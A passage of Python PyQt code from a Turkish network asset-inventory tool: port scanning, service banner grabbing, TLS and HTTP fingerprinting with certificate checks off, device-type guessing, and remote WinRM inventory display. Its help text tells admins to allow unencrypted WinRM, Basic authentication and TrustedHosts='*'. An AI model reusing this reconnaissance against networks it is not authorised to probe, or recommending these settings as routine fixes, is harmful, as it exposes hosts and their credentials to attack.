        if len(ip_list) > 10:
            msg += f"\n... ve {len(ip_list) - 10} tane daha"
        msg += "\n\nTaramak istiyor musunuz?"
        
        reply = QMessageBox.question(self, "Eksik Varlıkları Tara", msg,
                                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        
        if reply != QMessageBox.StandardButton.Yes:
            return
        
        # Kimlik bilgisi kontrolü
        username = self.user_input.text().strip()
        password = self.pass_input.text()
        
        if not username or not password:
            QMessageBox.warning(self, "Uyarı", 
                "Önce kullanıcı adı ve şifre girin!\n\n"
                "Domain: (opsiyonel)\n"
                "Kullanıcı: administrator\n"
                "Şifre: ********")
            return
        
        # IP'leri hedef olarak doldur
        self.target_input.setText(",".join(ip_list))
        
        # Taramayı başlat
        self.start_scan()
        
        # Bilgi mesajı
        self.status_label.setText(f"🔍 {len(ip_list)} eksik varlık taranıyor...")
    
    def test_connection(self):
        """Bağlantı testi - ping, port kontrolü ve cihaz bilgileri"""
        target = self.target_input.text().strip()
        
        if not target:
            QMessageBox.warning(self, "Uyarı", "Test için hedef IP girin!")
            return
        
        # İlk IP'yi al (aralık varsa)
        if '-' in target:
            target = target.split('-')[0].rsplit('.', 1)[0] + '.' + target.rsplit('.', 1)[1].split('-')[0]
        
        self.status_label.setText(f"🔌 Test ediliyor: {target}")
        QApplication.processEvents()
        
        results = []
        device_info = {}
        web_info = {}
        
        # 1. Ping testi
        ping_time = None
        try:
            ping_cmd = ['ping', '-n', '1', '-w', '1000', target]
            ping_result = subprocess.run(ping_cmd, capture_output=True, text=True, timeout=5,
                                        creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
            ping_ok = ping_result.returncode == 0
            if ping_ok:
                m = re.search(r'time[=<]?([\d.]+)', ping_result.stdout)
                ping_time = m.group(1) if m else "?"
            results.append(('🏓 Ping', f'✅ Başarılı ({ping_time}ms)' if ping_ok else '❌ Başarısız', ping_ok))
        except:
            results.append(('🏓 Ping', '❌ Timeout', False))
        
        # 2. Hostname çözümleme
        self.status_label.setText(f"🔍 Hostname çözümleniyor: {target}")
        QApplication.processEvents()
        try:
            hostname = socket.gethostbyaddr(target)[0]
            device_info['hostname'] = hostname
        except:
            device_info['hostname'] = '-'
        
        # 3. NetBIOS adı
        self.status_label.setText(f"🔍 NetBIOS sorgulanıyor: {target}")
        QApplication.processEvents()
        try:
            netbios = get_netbios(target)
            device_info['netbios'] = netbios if netbios else '-'
        except:
            device_info['netbios'] = '-'
        
        # 4. MAC adresi (ARP tablosundan)
        self.status_label.setText(f"🔍 MAC adresi alınıyor: {target}")
        QApplication.processEvents()
        try:
            arp_table = get_arp_table()
            mac = arp_table.get(target, '')
            device_info['mac'] = mac if mac else '-'
            
            # Vendor bilgisi
            if mac:
                vendor, dtype = get_mac_vendor(mac)
                device_info['vendor'] = vendor if vendor else '-'
                device_info['device_type'] = dtype if dtype else '-'
            else:
                device_info['vendor'] = '-'
                device_info['device_type'] = '-'
        except:
            device_info['mac'] = '-'
            device_info['vendor'] = '-'
            device_info['device_type'] = '-'
        
        # 5. Port testleri (genişletilmiş)
        self.status_label.setText(f"🔌 Portlar taranıyor: {target}")
        QApplication.processEvents()
        
        test_ports = [
            (135, 'RPC/DCOM', 'wmi'),
            (445, 'SMB', 'windows'),
            (5985, 'WinRM HTTP', 'winrm'),
            (5986, 'WinRM HTTPS', 'winrm'),
            (22, 'SSH', 'linux'),
            (3389, 'RDP', 'remote'),
            (80, 'HTTP', 'web'),
            (443, 'HTTPS', 'web'),
            (5900, 'VNC', 'vnc'),
            (5901, 'VNC Alt', 'vnc'),
            (139, 'NetBIOS', 'windows'),
            (21, 'FTP', 'ftp'),
            (23, 'Telnet', 'telnet'),
            (25, 'SMTP', 'mail'),
            (53, 'DNS', 'dns'),
            (3306, 'MySQL', 'database'),
            (5432, 'PostgreSQL', 'database'),
            (1433, 'MSSQL', 'database'),
            (8080, 'HTTP Alt', 'web'),
            (161, 'SNMP', 'network'),
        ]
        
        open_ports = []
        wmi_ports_ok = False
        
        for port, name, category in test_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()
                port_ok = result == 0
                if port_ok:
                    open_ports.append((port, name, category))
                    if port in [135, 445]:
                        wmi_ports_ok = True
            except:
                pass
        
        # WMI portlarını results'a ekle
        for port, name, category in test_ports[:4]:  # İlk 4 port WMI için önemli
            is_open = any(p[0] == port for p in open_ports)
            results.append((f'🔌 Port {port} ({name})', '✅ Açık' if is_open else '❌ Kapalı', is_open))
        
        # 6. HTTP/HTTPS bilgi toplama
        http_ports = [p[0] for p in open_ports if p[0] in [80, 443, 8080, 8443]]
        if http_ports:
            self.status_label.setText(f"🌐 Web bilgileri alınıyor: {target}")
            QApplication.processEvents()
            web_info = self.get_http_info(target, http_ports)
        
        # 7. SSH Banner
        banner_info = {}
        if any(p[0] == 22 for p in open_ports):
            self.status_label.setText(f"🔐 SSH banner alınıyor: {target}")
            QApplication.processEvents()
            ssh_banner = self.get_ssh_banner(target)
            if ssh_banner:
                banner_info['ssh'] = ssh_banner[:100]
        
        # 8. Telnet Banner
        if any(p[0] == 23 for p in open_ports):
            self.status_label.setText(f"📟 Telnet banner alınıyor: {target}")
            QApplication.processEvents()
            telnet_banner = self.get_telnet_banner(target)
            if telnet_banner:
                banner_info['telnet'] = telnet_banner[:200]
        
        # 9. FTP Banner
        if any(p[0] == 21 for p in open_ports):
            self.status_label.setText(f"📁 FTP banner alınıyor: {target}")
            QApplication.processEvents()
            ftp_banner = self.get_ftp_banner(target)
            if ftp_banner:
                banner_info['ftp'] = ftp_banner[:100]
        
        # 10. Cihaz türü tahmini
        device_guess = self.guess_device_type(open_ports, device_info, web_info, banner_info)
        device_info['guess'] = device_guess
        
        # Sonuçları göster
        result_text = f"""
╔══════════════════════════════════════════════════════════════════╗
║                     🔌 BAĞLANTI TESTİ                            ║
╚══════════════════════════════════════════════════════════════════╝

🎯  Hedef: {target}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋  TEST SONUÇLARI:

"""
        all_ok = True
        for test_name, test_result, is_ok in results:
            result_text += f"   {test_name}: {test_result}\n"
            if not is_ok:
                all_ok = False
        
        result_text += f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🖥️  CİHAZ BİLGİLERİ:

   📛 Hostname:     {device_info['hostname']}
   📛 NetBIOS:      {device_info['netbios']}
   🔗 MAC Adresi:   {device_info['mac']}
   🏭 Üretici:      {device_info['vendor']}
   📱 Cihaz Türü:   {device_info['device_type']}
   🎯 Tahmin:       {device_info['guess']}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔓  AÇIK PORTLAR ({len(open_ports)} adet):

"""
        if open_ports:
            for port, name, category in sorted(open_ports, key=lambda x: x[0]):
                result_text += f"   ✅ {port:5d} - {name}\n"
        else:
            result_text += "   ❌ Açık port bulunamadı\n"
        
        # Web bilgileri varsa göster
        if web_info:
            result_text += f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🌐  WEB BİLGİLERİ:

   📄 Sayfa Başlığı:  {web_info.get('title', '-')}
   🖥️ Sunucu:         {web_info.get('server', '-')}
   ⚙️ Teknoloji:      {web_info.get('powered_by', '-')}
   📝 Açıklama:       {web_info.get('description', '-')}
   🔧 Model:          {web_info.get('model', '-')}
   📦 Firmware:       {web_info.get('firmware', '-')}
   🔒 SSL CN:         {web_info.get('ssl_cn', '-')}
   🏢 SSL Org:        {web_info.get('ssl_org', '-')}
   📅 SSL Geçerlilik: {web_info.get('ssl_expiry', '-')}
   🔐 SSL Issuer:     {web_info.get('ssl_issuer', '-')}
   🔑 Auth Realm:     {web_info.get('auth_realm', '-')}
"""
        
        # Banner bilgileri varsa göster
        if banner_info:
            result_text += f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📡  SERVİS BANNER BİLGİLERİ:

"""
            if banner_info.get('ssh'):
                result_text += f"   🔐 SSH:    {banner_info['ssh']}\n"
            if banner_info.get('telnet'):
                # Telnet banner çok satırlı olabilir
                telnet_lines = banner_info['telnet'].split('\n')
                result_text += f"   📟 Telnet: {telnet_lines[0]}\n"
                for line in telnet_lines[1:3]:  # Max 3 satır
                    if line.strip():
                        result_text += f"             {line.strip()}\n"
            if banner_info.get('ftp'):
                result_text += f"   📁 FTP:    {banner_info['ftp']}\n"
        
        result_text += """
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"""
        if all_ok:
            result_text += """✅  TÜM TESTLER BAŞARILI!
   
   Uzaktan sistem bilgisi almaya hazırsınız.
   "BİLGİ TOPLA" butonuna tıklayın.
"""
        else:
            result_text += """⚠️  BAZI TESTLER BAŞARISIZ!

🔧  ÇÖZÜM:

   Hedef bilgisayarda şu komutları çalıştırın (Admin CMD):

   1. WinRM'i etkinleştir:
      > winrm quickconfig -y
      > winrm set winrm/config/service @{AllowUnencrypted="true"}
      > winrm set winrm/config/service/auth @{Basic="true"}

   2. PowerShell Remoting'i etkinleştir:
      > powershell -Command "Enable-PSRemoting -Force"

   3. Firewall'u ayarla:
      > netsh advfirewall firewall add rule name="WinRM-HTTP" dir=in action=allow protocol=TCP localport=5985
      > netsh advfirewall firewall add rule name="DCOM" dir=in action=allow protocol=TCP localport=135

   4. DCOM izinlerini ayarla:
      > winrm set winrm/config/client @{TrustedHosts="*"}

   💡 NOT: Domain ortamında GPO ile toplu yapılandırma önerilir.
"""
        
        self.general_text.setText(result_text)
        self.status_label.setText("✅ Test tamamlandı" if all_ok else "⚠️ Bazı testler başarısız")
    
    def get_http_info(self, ip, ports):
        """HTTP/HTTPS üzerinden bilgi topla"""
        import ssl
        import urllib.request
        import urllib.error
        
        info = {}
        
        for port in ports:
            try:
                is_https = port in [443, 8443]
                protocol = 'https' if is_https else 'http'
                url = f"{protocol}://{ip}:{port}/" if port not in [80, 443] else f"{protocol}://{ip}/"
                
                # SSL sertifika bilgisi
                if is_https:
                    try:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        
                        with socket.create_connection((ip, port), timeout=3) as sock:
                            with context.wrap_socket(sock, server_hostname=ip) as ssock:
                                cert = ssock.getpeercert(binary_form=True)
                                
                                # Sertifikayı parse et
                                try:
                                    import ssl as ssl_module
                                    cert_dict = ssl_module._ssl._test_decode_cert(cert) if hasattr(ssl_module._ssl, '_test_decode_cert') else None
                                except:
                                    cert_dict = None
                                
                                if cert_dict:
                                    # Subject bilgileri
                                    subject = dict(x[0] for x in cert_dict.get('subject', []))
                                    info['ssl_cn'] = subject.get('commonName', '-')
                                    info['ssl_org'] = subject.get('organizationName', '-')
                                    
                                    # Issuer bilgileri
                                    issuer = dict(x[0] for x in cert_dict.get('issuer', []))
                                    info['ssl_issuer'] = issuer.get('organizationName', issuer.get('commonName', '-'))
                                    
                                    # Geçerlilik
                                    info['ssl_expiry'] = cert_dict.get('notAfter', '-')
                                else:
                                    # Basit sertifika bilgisi al
                                    with context.wrap_socket(socket.socket(), server_hostname=ip) as s:
                                        s.settimeout(3)
                                        s.connect((ip, port))
                                        cert_bin = s.getpeercert(binary_form=False)
                                        if cert_bin:
                                            subject = dict(x[0] for x in cert_bin.get('subject', []))
                                            info['ssl_cn'] = subject.get('commonName', '-')
                                            info['ssl_org'] = subject.get('organizationName', '-')
                                            issuer = dict(x[0] for x in cert_bin.get('issuer', []))
                                            info['ssl_issuer'] = issuer.get('organizationName', '-')
                                            info['ssl_expiry'] = cert_bin.get('notAfter', '-')
                    except Exception as e:
                        pass
                
                # HTTP Header ve Title bilgisi
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    req = urllib.request.Request(url, headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) MotunNet/10.2'
                    })
                    
                    with urllib.request.urlopen(req, timeout=5, context=context) as response:
                        # Headers
                        server = response.headers.get('Server', '')
                        if server and 'server' not in info:
                            info['server'] = server
                        
                        powered_by = response.headers.get('X-Powered-By', '')
                        if powered_by:
                            info['powered_by'] = powered_by
                        
                        # Diğer faydalı headerlar
                        www_auth = response.headers.get('WWW-Authenticate', '')
                        if www_auth:
                            info['auth_type'] = www_auth[:50]
                        
                        # Body'den bilgi al
                        try:
                            content = response.read(16384).decode('utf-8', errors='ignore')
                            
                            # Title
                            title_match = re.search(r'<title[^>]*>([^<]+)</title>', content, re.IGNORECASE)
                            if title_match:
                                title = title_match.group(1).strip()[:60]
                                if title and title.lower() != 'loading...':
                                    info['title'] = title
                            
                            # Meta description
                            meta_desc = re.search(r'<meta[^>]*name=["\']description["\'][^>]*content=["\']([^"\']+)["\']', content, re.IGNORECASE)
                            if meta_desc:
                                info['description'] = meta_desc.group(1).strip()[:80]
                            
                            # Generator meta tag
                            generator = re.search(r'<meta[^>]*name=["\']generator["\'][^>]*content=["\']([^"\']+)["\']', content, re.IGNORECASE)
                            if generator:
                                info['generator'] = generator.group(1).strip()[:50]
                            
                            # Model/Product bilgisi arama
                            model_patterns = [
                                r'model["\s:=]+["\']?([A-Z0-9\-]+)',
                                r'product["\s:=]+["\']?([A-Z0-9\-]+)',
                                r'device["\s:=]+["\']?([A-Z0-9\-]+)',
                                r'<span[^>]*class=["\'][^"\']*model[^"\']*["\'][^>]*>([^<]+)</span>',
                                r'<div[^>]*class=["\'][^"\']*model[^"\']*["\'][^>]*>([^<]+)</div>',
                            ]
                            for pattern in model_patterns:
                                model_match = re.search(pattern, content, re.IGNORECASE)
                                if model_match and len(model_match.group(1)) > 2:
                                    info['model'] = model_match.group(1).strip()[:40]
                                    break
                            
                            # Firmware/Version bilgisi
                            fw_patterns = [
                                r'firmware["\s:=]+["\']?([0-9\.]+)',
                                r'version["\s:=]+["\']?([0-9\.]+)',
                                r'ver["\s:=]+["\']?([0-9\.]+)',
                                r'sw["\s:=]+["\']?([0-9\.]+)',
                            ]
                            for pattern in fw_patterns:
                                fw_match = re.search(pattern, content, re.IGNORECASE)
                                if fw_match:
                                    info['firmware'] = fw_match.group(1).strip()[:20]
                                    break
                                    
                        except:
                            pass
                except urllib.error.HTTPError as e:
                    # HTTP hatası olsa bile header bilgisi alınabilir
                    server = e.headers.get('Server', '') if e.headers else ''
                    if server and 'server' not in info:
                        info['server'] = server
                    
                    # 401 Unauthorized - realm bilgisi
                    if e.code == 401:
                        www_auth = e.headers.get('WWW-Authenticate', '') if e.headers else ''
                        if www_auth:
                            realm_match = re.search(r'realm=["\']([^"\']+)["\']', www_auth, re.IGNORECASE)
                            if realm_match:
                                info['auth_realm'] = realm_match.group(1)[:50]
                except:
                    pass
                
                # Bir porttan yeterli bilgi aldıysak devam etmeye gerek yok
                if info.get('title') and info.get('server'):
                    break
                    
            except Exception as e:
                continue
        
        return info
    
    def get_ssh_banner(self, ip, port=22):
        """SSH banner bilgisi al"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner
        except:
            return None
    
    def get_telnet_banner(self, ip, port=23):
        """Telnet banner bilgisi al"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            
            # İlk veriyi al
            banner_parts = []
            for _ in range(3):  # Max 3 okuma denemesi
                try:
                    data = sock.recv(1024)
                    if not data:
                        break
                    # Telnet kontrol karakterlerini temizle
                    clean_data = b''
                    i = 0
                    while i < len(data):
                        if data[i] == 0xFF and i + 2 < len(data):  # IAC komutu
                            i += 3  # IAC + CMD + OPTION atla
                        else:
                            clean_data += bytes([data[i]])
                            i += 1
                    
                    text = clean_data.decode('utf-8', errors='ignore').strip()
                    if text:
                        banner_parts.append(text)
                except socket.timeout:
                    break
            
            sock.close()
            return '\n'.join(banner_parts) if banner_parts else None
        except:
            return None
    
    def get_ftp_banner(self, ip, port=21):
        """FTP banner bilgisi al"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner
        except:
            return None
    
    def guess_device_type(self, open_ports, device_info, web_info=None, banner_info=None):
        """Açık portlara ve bilgilere göre cihaz türü tahmin et"""
        ports = [p[0] for p in open_ports]
        categories = [p[2] for p in open_ports]
        
        vendor = device_info.get('vendor', '').lower()
        hostname = device_info.get('hostname', '').lower()
        netbios = device_info.get('netbios', '').lower()
        
        # Banner bilgilerinden tahmin
        if banner_info:
            ssh_banner = banner_info.get('ssh', '').lower()
            telnet_banner = banner_info.get('telnet', '').lower()
            ftp_banner = banner_info.get('ftp', '').lower()
            
            # SSH Banner'dan
            if 'dropbear' in ssh_banner:
                return '📡 Gömülü Linux Sistem (Dropbear SSH)'
            if 'cisco' in ssh_banner:
                return '🌐 Cisco Ağ Cihazı'
            if 'mikrotik' in ssh_banner or 'routeros' in ssh_banner:
                return '🌐 MikroTik Router'
            if 'ubnt' in ssh_banner or 'ubiquiti' in ssh_banner:
                return '📡 Ubiquiti Ağ Cihazı'
            if 'fortinet' in ssh_banner or 'fortigate' in ssh_banner:
                return '🔥 FortiGate Güvenlik Duvarı'
            if 'ubuntu' in ssh_banner:
                return '🐧 Ubuntu Linux Sunucu'
            if 'debian' in ssh_banner:
                return '🐧 Debian Linux Sunucu'
            if 'freebsd' in ssh_banner:
                return '🐧 FreeBSD Sunucu'
            
            # Telnet Banner'dan
            if telnet_banner:
                if 'switch' in telnet_banner:
                    return '🌐 Ağ Switch'
                if 'router' in telnet_banner:
                    return '🌐 Router'
                if 'cisco' in telnet_banner:
                    return '🌐 Cisco Ağ Cihazı'
                if 'hp' in telnet_banner or 'procurve' in telnet_banner or 'aruba' in telnet_banner:
                    return '🌐 HP/Aruba Ağ Cihazı'
                if 'd-link' in telnet_banner or 'dlink' in telnet_banner:
                    return '🌐 D-Link Ağ Cihazı'
                if 'zyxel' in telnet_banner:
                    return '🌐 ZyXEL Ağ Cihazı'
                if 'huawei' in telnet_banner:
                    return '🌐 Huawei Ağ Cihazı'
                if 'juniper' in telnet_banner:
                    return '🌐 Juniper Ağ Cihazı'
                if 'login' in telnet_banner:
                    return '📡 Yönetilebilir Ağ Cihazı'
            
            # FTP Banner'dan
            if ftp_banner:
                if 'filezilla' in ftp_banner:
                    return '📁 Windows FTP Sunucu (FileZilla)'
                if 'vsftpd' in ftp_banner:
                    return '🐧 Linux FTP Sunucu (vsftpd)'
                if 'proftpd' in ftp_banner:
                    return '🐧 Linux FTP Sunucu (ProFTPD)'
                if 'iis' in ftp_banner:
                    return '🖥️ Windows FTP Sunucu (IIS)'
        
        # Web bilgilerinden tahmin
        if web_info:
            title = web_info.get('title', '').lower()
            server = web_info.get('server', '').lower()
            ssl_cn = web_info.get('ssl_cn', '').lower()
            ssl_org = web_info.get('ssl_org', '').lower()
            
            # Sunucu/Server bilgisinden
            if 'hikvision' in server or 'hikvision' in title:
                return '📹 Hikvision IP Kamera/NVR'
            if 'dahua' in server or 'dahua' in title:
                return '📹 Dahua IP Kamera/NVR'
            if 'axis' in server or 'axis' in ssl_org:
                return '📹 Axis IP Kamera'
            if 'vivotek' in server:
                return '📹 Vivotek IP Kamera'
            if 'ubiquiti' in server or 'unifi' in title:
                return '📡 Ubiquiti Ağ Cihazı'
            if 'mikrotik' in server or 'routeros' in title:
                return '🌐 MikroTik Router'
            if 'cisco' in server or 'cisco' in ssl_org:
                return '🌐 Cisco Ağ Cihazı'
            if 'zyxel' in server or 'zyxel' in title:
                return '🌐 ZyXEL Ağ Cihazı'
            if 'tp-link' in server or 'tp-link' in title:
                return '🌐 TP-Link Ağ Cihazı'
            if 'synology' in server or 'synology' in title or 'diskstation' in title:
                return '💾 Synology NAS'
            if 'qnap' in server or 'qnap' in title:
                return '💾 QNAP NAS'
            if 'cups' in server or 'printer' in title or 'yazıcı' in title:
                return '🖨️ Ağ Yazıcısı'
            if 'hp' in server and ('laserjet' in title or 'officejet' in title or 'printer' in title):
                return '🖨️ HP Yazıcı'
            if 'canon' in server or 'canon' in title:
                return '🖨️ Canon Yazıcı'
            if 'epson' in server or 'epson' in title:
                return '🖨️ Epson Yazıcı'
            if 'xerox' in server or 'xerox' in title:
                return '🖨️ Xerox Yazıcı'
            if 'iis' in server:
                return '🖥️ Windows Server (IIS)'
            if 'apache' in server:
                return '🐧 Linux/Apache Web Sunucu'
            if 'nginx' in server:
                return '🐧 Linux/Nginx Web Sunucu'
            if 'lighttpd' in server:
                return '📡 Gömülü Sistem (lighttpd)'
            if 'mini_httpd' in server or 'micro_httpd' in server:
                return '📡 Gömülü Sistem / IoT Cihaz'
            if 'boa' in server:
                return '📹 IP Kamera (Boa Server)'
            if 'webmin' in title:
                return '🐧 Linux Sunucu (Webmin)'
            if 'esxi' in title or 'vmware' in server:
                return '🖥️ VMware ESXi Sunucu'
            if 'idrac' in title or 'ilo' in title:
                return '🖥️ Sunucu Yönetim Kartı (iDRAC/iLO)'
            if 'proxmox' in title:
                return '🖥️ Proxmox Sanallaştırma Sunucu'
            if 'pfsense' in title or 'opnsense' in title:
                return '🔥 Güvenlik Duvarı (pfSense/OPNsense)'
            if 'fortinet' in server or 'fortigate' in title:
                return '🔥 FortiGate Güvenlik Duvarı'
            if 'sophos' in server or 'sophos' in title:
                return '🔥 Sophos Güvenlik Duvarı'
        
        # Vendor bazlı tahmin
        if any(x in vendor for x in ['cisco', 'juniper', 'huawei', 'mikrotik', 'ubiquiti']):
            return '🌐 Ağ Cihazı (Router/Switch)'
        if any(x in vendor for x in ['hikvision', 'dahua', 'axis', 'vivotek']):
            return '📹 IP Kamera'
        if any(x in vendor for x in ['hp', 'canon', 'epson', 'brother', 'lexmark', 'xerox', 'ricoh']):
            if 80 in ports or 443 in ports or 9100 in ports:
                return '🖨️ Yazıcı'
        if any(x in vendor for x in ['synology', 'qnap', 'western digital', 'netgear']):
            return '💾 NAS Cihazı'
        
        # Port bazlı tahmin
        if 3389 in ports and (445 in ports or 135 in ports):
            return '🖥️ Windows Bilgisayar (RDP Açık)'
        if 22 in ports and 445 not in ports and 135 not in ports:
            return '🐧 Linux/Unix Sistem'
        if 5900 in ports or 5901 in ports:
            return '🖥️ VNC Sunucu'
        if 80 in ports and 443 in ports and len(ports) < 5:
            return '🌐 Web Sunucu / Ağ Cihazı'
        if 161 in ports:
            return '📡 SNMP Destekli Ağ Cihazı'
        if 21 in ports:
            return '📁 FTP Sunucu'
        if any(p in ports for p in [3306, 5432, 1433]):
            return '🗄️ Veritabanı Sunucu'
        if 445 in ports and 135 in ports:
            return '🖥️ Windows Bilgisayar'
        if 22 in ports:
            return '🐧 SSH Sunucu (Linux/Unix)'
        
        # Hostname bazlı tahmin
        if any(x in hostname or x in netbios for x in ['print', 'yazici', 'prn']):
            return '🖨️ Yazıcı'
        if any(x in hostname or x in netbios for x in ['cam', 'kamera', 'nvr', 'dvr']):
            return '📹 IP Kamera / NVR'
        if any(x in hostname or x in netbios for x in ['srv', 'server', 'sunucu']):
            return '🖥️ Sunucu'
        if any(x in hostname or x in netbios for x in ['pc', 'desktop', 'laptop', 'nb']):
            return '💻 İstemci Bilgisayar'
        
        if len(ports) == 0:
            return '❓ Bilinmiyor (Port kapalı)'
        
        return '❓ Bilinmiyor'
    
    def stop_scan(self):
        """Taramayı durdur"""
        if self.scan_thread:
            self.scan_thread.stop()
        if hasattr(self, 'http_scan_thread') and self.http_scan_thread:
            self.http_scan_thread.stop()
        self.status_label.setText("⏹ Durduruldu")
        self.scan_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
    
    def on_progress(self, current, total, status):
        """İlerleme güncellemesi"""
        self.progress.setValue(current)
        self.status_label.setText(status)
    
    def on_system_info(self, info):
        """Sistem bilgisi alındığında"""
        self.results.append(info)
        
        # Listeye ekle
        pc_name = info['computer'].get('name', info['ip'])
        os_name = info['os'].get('name', 'Unknown OS')
        cpu_name = info['cpu'].get('name', '')[:30]
        ram = info['computer'].get('total_ram', 0)
        
        item_text = f"🖥️ {pc_name}\n   {os_name}\n   {cpu_name}... | {ram} GB RAM"
        item = QListWidgetItem(item_text)
        item.setData(Qt.ItemDataRole.UserRole, info['ip'])
        self.pc_list.addItem(item)
        
        self.stats_label.setText(f"📊 {len(self.results)} bilgisayar tarandı")
    
    def on_error(self, ip, error):
        """Hata durumunda - detaylı bilgi göster"""
        error_short = str(error)[:50] if error else "Bilinmeyen hata"
        item = QListWidgetItem(f"❌ {ip}\n   {error_short}")
        item.setForeground(QColor('#e74c3c'))
        item.setData(Qt.ItemDataRole.UserRole, f"error:{ip}")
        self.pc_list.addItem(item)
        
        # Sağ panelde hata detaylarını göster
        self.general_text.setText(f"""
╔══════════════════════════════════════════════════════════════════╗
║                      ❌ BAĞLANTI HATASI                          ║
╚══════════════════════════════════════════════════════════════════╝

🎯  Hedef IP: {ip}
⚠️  Hata: {error}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋  OLASI NEDENLER:

1️⃣  WinRM Servisi Kapalı
    → Hedef bilgisayarda WinRM aktif değil
    
2️⃣  Firewall Engeli
    → Port 5985, 5986, 135, 445 kapalı olabilir
    
3️⃣  Yetki Sorunu
    → Kullanıcı admin grubunda olmayabilir
    
4️⃣  Ağ Erişimi
    → Hedef bilgisayara ping atılamıyor olabilir

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔧  ÇÖZÜM ADIMLARI:

Hedef bilgisayarda CMD (Admin) aç ve şu komutları çalıştır:

1. WinRM'i etkinleştir:
   > winrm quickconfig -y

2. Uzak yönetimi etkinleştir:
   > Enable-PSRemoting -Force

3. Firewall kuralı ekle:
   > netsh advfirewall firewall add rule name="WinRM" dir=in action=allow protocol=TCP localport=5985

4. DCOM ayarı (opsiyonel):
   > winrm set winrm/config/client @{{TrustedHosts="*"}}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔄  Alternatif olarak GPO ile toplu etkinleştirme yapabilirsiniz.
""")
    
    def on_scan_complete(self, results):
        """Tarama tamamlandığında"""
        self.scan_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_label.setText(f"✅ Tamamlandı - {len(results)} bilgisayar")
        self.result_count_label.setText(f"📊 {len(results)} cihaz bulundu")
        
        # Varlıklara ekleme butonunu aktif et
        if results:
            self.add_to_assets_btn.setEnabled(True)
        
        if self.pc_list.count() > 0:
            self.pc_list.setCurrentRow(0)
            self.on_pc_selected(self.pc_list.item(0))
    
    def on_pc_selected(self, item):
        """PC seçildiğinde detayları göster"""
        if not item:
            return
        
        ip = item.data(Qt.ItemDataRole.UserRole)
        if not ip:
            return
        
        info = next((r for r in self.results if r['ip'] == ip), None)
        if not info:
            return
        
        # Genel Tab
        general = f"""
╔══════════════════════════════════════════════════════════════════╗
║                        SİSTEM BİLGİLERİ                          ║
╚══════════════════════════════════════════════════════════════════╝

🖥️  BİLGİSAYAR
   ├─ Ad: {info['computer'].get('name', '-')}
   ├─ Üretici: {info['computer'].get('manufacturer', '-')}
   ├─ Model: {info['computer'].get('model', '-')}
   ├─ Tip: {info['computer'].get('type', '-')}
   ├─ Domain: {info['computer'].get('domain', '-')}
   └─ Kullanıcı: {info['computer'].get('user', '-')}

🪟  İŞLETİM SİSTEMİ
   ├─ {info['os'].get('name', '-')}
   ├─ Versiyon: {info['os'].get('version', '-')}
   ├─ Build: {info['os'].get('build', '-')}
   ├─ Mimari: {info['os'].get('arch', '-')}
   ├─ Kurulum: {info['os'].get('install_date', '-')}
   └─ Son Açılış: {info['os'].get('last_boot', '-')}

🔑  BIOS
   ├─ Üretici: {info['bios'].get('manufacturer', '-')}
   ├─ Versiyon: {info['bios'].get('version', '-')}
   └─ Seri No: {info['bios'].get('serial', '-')}
"""
        self.general_text.setText(general)
        
        # Donanım Tab
        hw = f"""
╔══════════════════════════════════════════════════════════════════╗
║                        DONANIM BİLGİLERİ                         ║
╚══════════════════════════════════════════════════════════════════╝

🔧  İŞLEMCİ (CPU)
   ├─ {info['cpu'].get('name', '-')}
   ├─ Çekirdek: {info['cpu'].get('cores', '-')} | Thread: {info['cpu'].get('threads', '-')}
   ├─ Max Hız: {info['cpu'].get('max_speed', '-')}
   └─ Güncel Hız: {info['cpu'].get('current_speed', '-')}

🧠  BELLEK (RAM)
   └─ Toplam: {info['ram'].get('total', '-')}
"""
        if info['ram'].get('modules'):
            for i, m in enumerate(info['ram']['modules'], 1):
                hw += f"""
   [{i}] {m['capacity']} | {m['speed']} | {m['manufacturer']} | {m['slot']}"""
        
        hw += f"""

🎮  EKRAN KARTI (GPU)"""
        if info['gpu']:
            for i, g in enumerate(info['gpu'], 1):
                hw += f"""
   [{i}] {g['name']}
       ├─ VRAM: {g['vram']}
       ├─ Sürücü: {g['driver']}
       └─ Çözünürlük: {g['resolution']}"""
        else:
            hw += "\n   Bilgi alınamadı"
        
        hw += """

🔊  SES KARTI"""
